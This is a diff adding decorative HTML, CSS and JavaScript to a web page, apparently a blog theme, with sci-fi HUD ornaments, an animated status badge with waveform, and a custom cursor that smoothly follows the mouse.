+  <!-- Ring edge dots -->
+  <span class="ring-dot" style="top: 14%; right: 42px"></span>
+  <span class="ring-dot" style="bottom: 67%; left: 46px"></span>
+
+  <!-- Grid markers: + signs, crosshairs, hollow squares -->
+  <span class="grid-marker" style="top: 12%; left: 18%">+</span>
+  <span class="grid-marker" style="top: 28%; left: 74%">+</span>
+  <span class="grid-marker" style="top: 62%; left: 88%">+</span>
+  <span class="grid-marker cross" style="top: 20%; left: 38%"></span>
+  <span class="grid-marker cross" style="top: 72%; left: 22%"></span>
+  <span class="grid-marker cross" style="top: 45%; left: 58%"></span>
+  <span class="grid-marker square" style="top: 8%; left: 82%"></span>
+  <span class="grid-marker square" style="top: 80%; left: 68%"></span>
+  <span class="grid-marker square" style="top: 52%; left: 12%"></span>
+
+  <!-- Technical text -->
+  <div class="decal-labels">
+    <span class="decal-text t1">SYSTEM STATUS: ACTIVE</span>
+    <span class="decal-text t2">ENCRYPTED SECTOR 7</span>
+    <span class="decal-text t3">PRTS_TERMINAL_V2.0</span>
+    <span class="decal-text t4">PROTOCOL: 0x2A</span>
+    <span class="decal-text t5">ENCRYPTED DATA STREAM</span>
+    <span class="decal-text t6">SYSTEM: ONLINE</span>
+  </div>
+</div>
+
+<!-- Fixed red particle "dead pixels" -->
+<div class="hud-particles" aria-hidden="true">
+  <span class="hud-particle" style="top: 8%; left: 18%"></span>
+  <span class="hud-particle" style="top: 22%; left: 72%"></span>
+  <span class="hud-particle" style="top: 65%; left: 35%"></span>
+  <span class="hud-particle" style="top: 78%; left: 85%"></span>
+  <span class="hud-particle" style="top: 35%; left: 58%"></span>
+  <span class="hud-particle" style="top: 90%; left: 12%"></span>
+  <span class="hud-particle" style="top: 15%; left: 42%"></span>
+</div>
+
+<!-- ============================================================
+     TACTICAL VERTICAL DATA BUS (Scroll Progress & Glitch Text)
+     ============================================================ -->
+<div class="hud-vertical-bus" id="tacticalBus" aria-hidden="true">
+  <div class="bus-track"></div>
+  <div class="bus-progress" id="busProgress"></div>
+  
+  <div class="bus-text">
+    <div class="word-group">
+      <span>C</span><span>O</span><span>D</span><span>E</span>
+    </div>
+    <div class="bus-separator"></div>
+    <div class="word-group">
+      <span class="node-square">A</span><span>N</span><span>A</span><span class="node-diamond">L</span><span>Y</span><span>Z</span><span>E</span>
+    </div>
+    <div class="bus-separator"></div>
+    <div class="word-group">
+      <span>S</span><span>O</span><span>L</span><span>V</span><span>E</span>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================================
+     CUSTOM CURSOR STALKER
+     ============================================================ -->
+<div id="mouse_stalker"></div>
+
+<script>
+  (() => {
+    const stalker = document.getElementById("mouse_stalker");
+    if (!window.matchMedia("(any-hover: hover)").matches || !stalker) return;
+
+    const CONFIG = {
+      smooth: 0.35,
+      scaleSmooth: 0.15,
+      baseScale: 1,
+      hoverScale: 1.8,
+      offset: 15,
+      stretchFactor: 0.04,
+      maxStretch: 0.2,
+      stickiness: 0.6,
+      hoverSelectors:
+        "a, button, .toggle, #exturl, #post-title, .article-title, .nav-link, .copy-btn, .badge-normal",
+    };
+
+    let state = {
+      mouse: { x: -100, y: -100 },
+      circle: { x: -100, y: -100, scale: 1 },
+      prevCircle: { x: -100, y: -100 },
+      target: null,
+      isHovering: false,
+      isClicked: false,
+      isVisible: false,
+    };
+
+    const lerp = (a, b, n) => (1 - n) * a + n * b;
+
+    const handleMouseMove = (e) => {
+      state.mouse.x = e.clientX;
+      state.mouse.y = e.clientY;
+
+      if (!state.isVisible) {
+        state.circle.x = state.prevCircle.x = state.mouse.x;
+        state.circle.y = state.prevCircle.y = state.mouse.y;
+        stalker.style.opacity = 1;
+        state.isVisible = true;
+      }
+    };
+
+    const handleMouseOver = (e) => {
+      const el = e.target.closest(CONFIG.hoverSelectors);
+      if (el) {
+        const r = el.getBoundingClientRect();
+        state.target = {
+          cx: r.left + r.width / 2 + window.scrollX,
+          cy: r.top + r.height / 2 + window.scrollY,
+        };
+        state.isHovering = true;
+        stalker.classList.add("stalker_cursor_pointer");
+      }
+    };
+
+    const handleMouseOut = (e) => {
+      if (e.target.closest(CONFIG.hoverSelectors)) {
+        state.target = null;
+        state.isHovering = false;
+        stalker.classList.remove("stalker_cursor_pointer");
+      }
+    };
+
+    const resetStalker = () => {
+      state.target = null;
+      state.isHovering = false;
+      state.isClicked = false;
+      stalker.className = "";
+    };
+
+    window.addEventListener("mousemove", handleMouseMove, { passive: true });
+    window.addEventListener("mouseover", handleMouseOver, { passive: true });
+    window.addEventListener("mouseout", handleMouseOut, { passive: true });
+    window.addEventListener(
+      "mousedown",
+      () => {
+        state.isClicked = true;
+        stalker.classList.add("is_clicked");
+      },
+      { passive: true },
+    );
+    window.addEventListener(
+      "mouseup",
+      () => {
+        state.isClicked = false;
+        stalker.classList.remove("is_clicked");
+      },
+      { passive: true },
+    );
+
+    ["pjax:send", "pjax:complete", "popstate"].forEach((ev) =>
+      document.addEventListener(ev, resetStalker, { passive: true }),
+    );
+
+    const tick = () => {
+      const tx = state.target
+        ? lerp(
+            state.mouse.x,
+            state.target.cx - window.scrollX,
+            CONFIG.stickiness,
+          )
+        : state.mouse.x;
+      const ty = state.target
+        ? lerp(
+            state.mouse.y,
+            state.target.cy - window.scrollY,
+            CONFIG.stickiness,
+          )
+        : state.mouse.y;
+
+      state.circle.x = lerp(state.circle.x, tx, CONFIG.smooth);
+      state.circle.y = lerp(state.circle.y, ty, CONFIG.smooth);
+
+      const dx = state.circle.x - state.prevCircle.x;
+      const dy = state.circle.y - state.prevCircle.y;
+      const speed = Math.sqrt(dx * dx + dy * dy);
+      const angle = Math.atan2(dy, dx);
+
+      const stretch = Math.min(speed * CONFIG.stretchFactor, CONFIG.maxStretch);
+      const targetScale = state.isHovering
+        ? CONFIG.hoverScale
+        : CONFIG.baseScale;
+      state.circle.scale = lerp(
+        state.circle.scale,
+        targetScale,
+        CONFIG.scaleSmooth,
+      );
+
+      stalker.style.transform = `translate3d(${state.circle.x - CONFIG.offset}px, ${state.circle.y - CONFIG.offset}px, 0) rotate(${angle}rad) scale(${(1 + stretch) * state.circle.scale}, ${(1 - stretch) * state.circle.scale})`;
+
+      state.prevCircle.x = state.circle.x;
+      state.prevCircle.y = state.circle.y;
+
+      requestAnimationFrame(tick);
+    };
+
+    requestAnimationFrame(tick);
+  })();
+</script>
+
+<!-- ============================================================
+     BOTTOM-RIGHT HUD GROUP (Badge + ECG)
+     ============================================================ -->
+<div class="hud-status-group" aria-hidden="true">
+  <div class="badge-normal">
+    <span>NORMAL</span>
+  </div>
+
+  <div class="hud-ecg-waveform">
+    <svg viewBox="0 0 100 30" class="seismic-wave">
+      <path
+        d="M0,15 L5,15 L8,13 L11,17 L15,15 L20,15 L23,10 L26,25 L30,2 L34,28 L38,12 L42,15 L48,15 L52,14 L56,16 L60,15 L64,15 L67,11 L70,24 L74,4 L78,26 L82,13 L86,15 L92,15 L100,15"
+      />
+    </svg>
+  </div>
+
+  <span class="grid-marker cross hud-group-cross"></span>
+</div>
+
+<style>
+  /* HUD Group Layout */
+  .hud-status-group {
+    position: fixed;
+    bottom: 24px;
+    right: 24px;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    z-index: 999;
+    pointer-events: none;
+  }
+
+  /* NORMAL Badge Styling */
+  .badge-normal {
+    position: relative;
+    padding: 4px 14px;
+    background: rgba(255, 62, 62, 0.05);
+    border: 1px solid rgba(255, 62, 62, 0.3);
+    box-shadow:
+      inset 0 0 8px rgba(255, 62, 62, 0.15),
+      0 0 4px rgba(255, 62, 62, 0.2);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    /* 交互修复：显式开启事件响应 */
+    pointer-events: auto !important;
+    user-select: none;
+    z-index: 1001; /* 确保在组合层之上 */
+    transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+  }
+
+  .badge-normal:hover {
+    background: rgba(255, 62, 62, 0.12);
+    border-color: rgba(255, 62, 62, 0.6);
+    transform: translateY(-2px);
+    filter: brightness(1.2);
+  }
+
+  .badge-normal:active {
+    transform: translateY(1px);
+    filter: brightness(0.9);
+  }
+
+  .badge-normal::before,
+  .badge-normal::after {
+    content: "";
+    position: absolute;
+    top: -1px;
+    bottom: -1px;
+    width: 4px;
+  }
+
+  .badge-normal::before {
+    left: -1px;
+    border-left: 2px solid rgba(255, 62, 62, 0.9);
+    box-shadow: -2px 0 4px rgba(255, 62, 62, 0.4);
+  }
+  .badge-normal::after {
+    right: -1px;
+    border-right: 2px solid rgba(255, 62, 62, 0.9);
+    box-shadow: 2px 0 4px rgba(255, 62, 62, 0.4);
+  }
+
+  .badge-normal span {
+    color: #ff3e3e;
+    font-family: "Roboto Mono", monospace;
+    font-size: 14px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    line-height: 1.2;
+    text-shadow:
+      0 0 3px rgba(255, 62, 62, 0.8),
+      0 0 8px rgba(255, 62, 62, 0.4);
+  }
+
+  /* Seismic Waveform Styling */
+  .hud-ecg-waveform {
+    width: 110px;
+    height: 35px;
+    opacity: 0.95;
+  }
+
+  .hud-ecg-waveform svg {
+    width: 100%;
+    height: 100%;
+    filter: drop-shadow(0 0 4px rgba(255, 62, 62, 0.8));
+  }
+
+  .hud-ecg-waveform path {
+    stroke: #ff3e3e;
+    stroke-width: 1.5;
+    fill: none;
+    stroke-dasharray: 200;
+    stroke-dashoffset: 200;
+    stroke-linecap: round;
+    stroke-linejoin: round;
+    animation: seismic-scan 2s linear infinite;
+  }
+
+  @keyframes seismic-scan {
+    0% {
+      stroke-dashoffset: 200;
+    }
+    50% {
+      stroke-dashoffset: 0;
+    }
+    100% {
+      stroke-dashoffset: -200;
+    }
+  }
+
+  /* Group Cross Marker */
+  .hud-group-cross {
+    position: absolute;
+    bottom: -10px;
+    right: -10px;
+    width: 12px;
+    height: 12px;
+    opacity: 0.6;
+  }
+</style>
+
+<!-- ============================================================
+     CUSTOM CURSOR STALKER
+     ============================================================ -->
+<style>
+  :root {
+    --my-brand-color: #cccccc;
+    --my-brand-rgb: 200, 200, 200;
+    --my-hover-color: #ffffff;
+    --my-hover-rgb: 255, 255, 255;
+    --cursor-size: 30px;
+  }
+
+  @media (any-hover: hover) {
+    body,
+    a,
+    button,
+    input,
+    textarea,
+    .copy-btn {
+      cursor: none;
+    }
+
+    #mouse_stalker {
+      pointer-events: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: var(--cursor-size);
+      height: var(--cursor-size);
+      background: rgba(var(--my-brand-rgb), 0.85);
+      border: 4px solid var(--my-brand-color);
+      border-radius: 50%;
+      z-index: 99999;
+      opacity: 0;
+      will-change: transform;
+      transform: translate3d(-100px, -100px, 0);
+      mix-blend-mode: difference;
+      transition:
+        background-color 0.2s cubic-bezier(0.25, 0.46, 0.45, 0.94),
+        border-color 0.2s cubic-bezier(0.25, 0.46, 0.45, 0.94),
+        border-width 0.1s ease;
+    }
+
+    #mouse_stalker::after {
+      content: "";
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 4px;
+      height: 4px;
+      background-color: var(--my-brand-color);
+      border-radius: 50%;
+      box-shadow: 0 0 8px rgba(255, 255, 255, 1);
+    }
+
+    #mouse_stalker.stalker_cursor_pointer {
+      background: rgba(var(--my-hover-rgb), 0.4);
+      border-color: var(--my-hover-color);
+      border-width: 8px;
+    }
+
+    #mouse_stalker.stalker_cursor_pointer::before {
+      content: "";
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 100%;
+      height: 100%;
+      border: 8px solid var(--my-hover-color);
+      border-radius: 50%;
+      animation: stalker_appeal 2s ease-out infinite;
+    }
+
+    #mouse_stalker.is_clicked {
+      background: rgba(255, 255, 255, 0.4);
+      border-color: var(--my-brand-color);
+      border-width: 3px;
+    }
+  }
+
+  @keyframes stalker_appeal {
+    0% {
+      opacity: 1;
+      transform: translate(-50%, -50%) scale(1);
+    }
+    100% {
+      opacity: 0;
+      transform: translate(-50%, -50%) scale(2.5);
+    }
+  }
+
+  @media (any-hover: none) {
+    #mouse_stalker {
+      display: none;
+    }
+  }
+</style>
+
+</body>
+</html>
